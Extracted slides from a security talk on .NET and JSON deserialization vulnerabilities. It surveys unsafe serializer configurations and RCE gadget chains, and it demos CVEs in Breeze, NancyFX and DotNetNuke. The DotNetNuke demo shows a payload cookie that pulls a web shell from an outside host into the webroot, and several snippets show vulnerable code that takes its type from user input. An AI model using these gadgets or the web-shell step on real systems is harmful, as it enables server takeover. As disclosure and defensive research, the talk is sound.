JavaScriptSerializer
• System.Web.Script.Serialization.JavaScriptSerializer
• By default, it will not include type discriminator information which 
makes it a secure serializer.
• Type Resolver can be configured to include this information.
• Weak Type control: post-deserialization cast operation
• During deserialization, it will call:
• Setters
• It can be used securely as long as a type resolver is not used or the 
type resolver is configured to whitelist valid types.
JavaScriptSerializer sr = new JavaScriptSerializer(new SimpleTypeResolver());
string reqdInfo = apiService.authenticateRequest();
reqdDetails det = (reqdDetails)(sr.Deserialize(reqdInfo));
DataContractJsonSerializer
• System.Runtime.Serialization.Json.DataContractJsonSerializer
• Performs a strict type graph inspection and prevent deserialization of 
certain types. 
• However, we found that if the attacker can control the expected type used 
to configure the deserializer, they will be able to gain code execution.
• Invokes:
• Setters
• Serialization Constructors
• Can be used securely as long as the expected type cannot be controlled by 
users.
var typename = cookie["typename"];
…
var serializer = new DataContractJsonSerializer(Type.GetType(typename));
var obj = serializer.ReadObject(ms);
Json.Net
• Secure by default unless TypeNameHandling other than None setting is 
used
• Even if TypeNameHandling is enabled, attackers still need to find entry 
point in object graph
• Invokes:
• Setters
• Serialization callbacks
• Type Converters
• Use SerializationBinder to whitelist Types if TypeNameHandling is 
required
public class Message { 
[JsonProperty(TypeNameHandling = TypeNameHandling.All)] 
public object Body { get; set; } 
}
Demo 1: Breeze (CVE-2017-9424)
Fixed in Breeze 1.6.5 onwards
Serializer Settings
http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/8u40-b25/com/sun/rowset/JdbcRowSetImpl.java/
Unsafe Deserialization & Entrypoint
https://github.com/Breeze/breeze.server.net/blob/master/AspNet/Breeze.ContextProvider/ContextProvider.cs
Video
Similar Research
• Java Unmarshaller Security
• Author: Moritz Bechler
• Parallel research published on May 22, after our research was accepted for 
BlackHat and abstract was published ☺.
• Focus exclusively on Java
• Overlaps with our research on:
• Jackson and JSON-IO libraries
• JdbcRowSetImpl.setAutoCommit gadget
• Include other interesting gadgets
• https://github.com/mbechler/marshalsec
.NET Formatters
Introduction
• Attacks on .NET formatters are not 
new
• James Forshaw already introduced 
them at BlackHat 2012 for 
• BinaryFormatter
• NetDataContractSerializer
• Lack of RCE gadget until recently 
•
Goals:
•
Raise awareness about perils of .NET 
deserialization
•
Present new vulnerable formatters 
scenarios
•
Present new gadgets
•
Need new gadgets that works with 
Formatters other than BinaryFormatter
PSObject Gadget
• Bridges to custom deserializer
https://github.com/stangelandcl/pash-1/blob/master/System.Management.Automation/System.Management.Automation/PSObject.cs
PSObject Gadget
https://github.com/stangelandcl/pash-1/blob/master/System.Management.Automation/System.Management.Automation/InternalDeserializer.cs
…
…
LanguagePrimitives.FigureConversion() allows to:
• Call the constructor of any public Type with one argument (attacker controlled)
• Call any setters of public properties for the attacker controlled type
• Call the static public Parse(string) method of the attacker controlled type. 
https://github.com/stangelandcl/pash-1/blob/master/System.Management.Automation/System.Management.Automation/LanguagePrimitives.cs
PSObject Gadget
System.Windows.Markup.XamlReader.Parse() -> Process.Start(“calc.exe”)
https://github.com/stangelandcl/pash-1/blob/master/System.Management.Automation/System.Management.Automation/LanguagePrimitives.cs
…
PSObject Gadget
.NET Native Formatters I
• System.Runtime.Serialization.Formatters.Soap.SoapFormatter
• Serializes objects to and from SOAP XML format. 
• Similar to BinaryFormatter in a number of things; 
• They both implements IFormatter interface and serialize only Serializable
annotated types. 
• Both use surrogates to handle custom serialization and binders to control the type 
loading. 
• Both will invoke similar methods upon deserialization which include:
• setters, Iserializable constructor, OnDeserialized annotated methods and 
OnDeserialization callback. 
• System.Web.Script.Serialization.JavaScriptSerializer
• Covered in JSON section
.NET Native Formatters II
• System.Web.UI.ObjectStateFormatter
• Used by LosFormatteras a binary formatter for persisting the view state for 
Web Forms pages. It uses BinaryFormatterinternally and therefore offers 
similar attack surface.
• Uses TypeConverters
• System.Messaging.XmlMessageFormatter
• It is the default formatter used by MSMQ. It uses XmlSerializerinternally 
and therefore it is vulnerable to same attack patterns.
• System.Messaging.BinaryMessageFormatter
• Used by MSMQ as a binary formatter for sending messages to queues. It uses 
BinaryFormatter internally and therefore offers similar attack surface.
.NET Native Formatters III
• System.Runtime.Serialization.DataContractSerializer
• It inspects the object graph of the expected type and limits the deserialization to only those 
types known at construction time (either in the object graph or supplied with KnownTypes
list parameter).
• Suitable to handle untrusted data unless any of the following scenarios apply:
• Using a weak type resolver 
• Using user controlled expected type
• Will invoke multiple methods which can be used to initiate a RCE gadget chain such as setters 
and serialization constructors.
• System.Runtime.Serialization.Json.DataContractJsonSerializer
• Covered in JSON section
• Very similar to DataContractSerializer
• No type resolvers can be used
Type objType = Type.GetType(message.Label.Split('|')[1], true, true);
DataContractSerializer serializer = new DataContractSerializer(objType);
serializer.ReadObject(message.BodyStream);
.NET Native Formatters IV
• System.Xml.Serialization.XmlSerializer
• Will inspect the expected type at construction time and create an ad-hoc 
serializer that will only know about those types appearing in the object graph. 
• Prevents deserialization of interface members. 
• Only vulnerable configuration for this deserializer is when attacker can control 
the expected type.
• From an attacker perspective, overcoming the type limitation can be a 
problem, but we will show later that this can be done with some tricks. 
var typename = cookie["typename"];
…
var typeName = xmlItem.GetAttribute("type");
var xser = new XmlSerializer(Type.GetType(typeName));
Demo 2: NancyFX (CVE-2017-9785)
Fixed in version 1.4.4 / 2.0-dangermouse onwards
NCSRF Cookie
• CSRF cookie
• Latest stable version used a BinaryFormatter serialized cookie (1.x)
• AAEAAAD/////AQAAAAAAAAAMAgAAAD1OYW5jeSwgVmVyc2lvbj0wLjEwLjAuMCwgQ3VsdHVyZT1uZX
V0cmFsLCBQdWJsaWNLZXlUb2tlbj1udWxsBQEAAAAYTmFuY3kuU2VjdXJpdHkuQ3NyZlRva2VuAwAA
ABw8UmFuZG9tQnl0ZXM+a19fQmFja2luZ0ZpZWxkHDxDcmVhdGVkRGF0ZT5rX19CYWNraW5nRmllbG
QVPEhtYWM+a19fQmFja2luZ0ZpZWxkBwAHAg0CAgAAAAkDAAAAspLEeOrO0IgJBAAAAA8DAAAACgAA
AAJ9FN3bma5ztsdODwQAAAAgAAAAAt9dloO6qU2iUAuPUAtsq+Ud0w5Qu1py8YhoCn5hv+PJCwAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
• Pre-released 2.x used a custom JSON parser to make it compatible with .NET Core first versions
• {"RandomBytes":[60,142,24,76,245,9,202,183,56,252],"CreatedDate":"2017-04-
03T10:42:16.7481461Z","Hmac":[3,17,70,188,166,30,66,0,63,186,44,213,201,164,3,
19,56,139,78,159,170,193,192,183,242,187,170,221,140,46,24,197],"TypeObject":"
Nancy.Security.CsrfToken, Nancy, Version=2.0.0.0, Culture=neutral, 
PublicKeyToken=null”} 
• Pre-auth RCE in both versions 
Video
Generalizing the 
Attacks
Attacking all the deserializers
• When dealing with object unmarshaling, objects will need to be 
created and populated which normally mean calling setters or 
deserialization constructors.
• Requirements
• Attacker can control type to be instantiated upon deserialization
• Methods are called on the reconstructed objects
• Gadget space is big enough to find types we can chain to get RCE
• We can use the presented gadgets to attack these formats
Examples
• FsPickler (xml/binary)
• A fast, multi-format messaging serializer for .NET
• Includes arbitrary Type discriminators
• Invokes setters and ISerializableconstructor and callbacks
• Object Graph Inspection
• SharpSerializer
• XML and binary serialization for .NET and Silverlight
• Includes arbitrary Type discriminators
• Invokes setters
• No type control other than post-deserialization cast
• Wire/Hyperion
• A high performance polymorphic serializer for the .NET framework used by Akka.NET
• JSON.NET with TypeNameHandling = All or custom binary one
• Includes Type discriminators and invokes setters and ISerializable constructor and 
callbacks
Beware of rolling your own format
• NancyFX
• Custom JSON parser replacing BinaryFormatter (Pre-released 2.x ) to make it 
compatible with .NET Core first versions
• DotNetNuke CMS (DNN Platform)
• Wraps XmlSerializeraround a custom XML format which includes the type 
to be used to create the XmlSerializer
• This deserves a slide on its own ☺
{"RandomBytes":[60,142,24,76,245,9,202,183,56,252],"CreatedDate":
"2017-04-
03T10:42:16.7481461Z","Hmac":[3,17,70,188,166,30,66,0,63,186,44,2
13,201,164,3,19,56,139,78,159,170,193,192,183,242,187,170,221,140
,46,24,197],"TypeObject":"Nancy.Security.CsrfToken, Nancy, 
Version=2.0.0.0, Culture=neutral, PublicKeyToken=null”} 
Overcoming XmlSerializer constraints
• Types with interface members cannot be serialized
• System.Windows.Data.ObjectDataProvider is XmlSerializerfriendly ☺
• System.Diagnostic.Processhas Interface members  … use any other 
Type!
• XamlReader.Load(String) -> RCE 
• ObjectStateFormatter.Deserialize(String) -> RCE
• DotNetNuke.Common.Utilities.FileSystemUtils.PullFile(String) -> WebShell
• DotNetNuke.Common.Utilities.FileSystemUtils.WriteFile(String) -> Read files
• Runtime Types needs to be known at serializer construction time
• ObjectDataProvidercontains an Object member (unknown runtime Type)
• Use a parametrized Type to “teach” XmlSerializer about runtime types. Eg:
System.Data.Services.Internal.ExpandedWrapper`2[
[PUT_RUNTIME_TYPE_1_HERE],[PUT_RUNTIME_TYPE_2_HERE]
], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089 
Demo 3: DotNetNuke (CVE-2017-9822)
Fixed in DNN Platform 9.1.1 or EVOQ 9.1.1 onwards
Source
https://github.com/dnnsoftware/Dnn.Platform/blob/a142594a0c18a589cb5fb913a022eebe34549a8f/DNN%20Platform/Library/Services/Personalization/PersonalizationController.cs#L72
Sink
https://github.com/dnnsoftware/Dnn.Platform/blob/a142594a0c18a589cb5fb913a022eebe34549a8f/DNN%20Platform/Library/Common/Utilities/XmlUtils.cs#L201
Video
DNNPersonalization Regular Cookie
false
DNNPersonalization Payload Cookie
PullFile
http://ctf.pwntester.com/shell.aspx
C:\inetpub\wwwroot\dotnetnuke\shell.aspx
Wrap-Up
Main Takeaways
• Do not deserialize untrusted data!
• … no, seriously, do not deserialize untrusted data!
• … ok, if you really need to:
• Make sure to evaluate the security of the chosen library
• Avoid libraries without strict Type control
• Type discriminators are necessary but not sufficient condition
• Never use user-controlled data to define the deserializer expected Type
• Do not roll your own format
Thank you!
Alvaro Muñoz (@pwntester) & Oleksandr Mirosh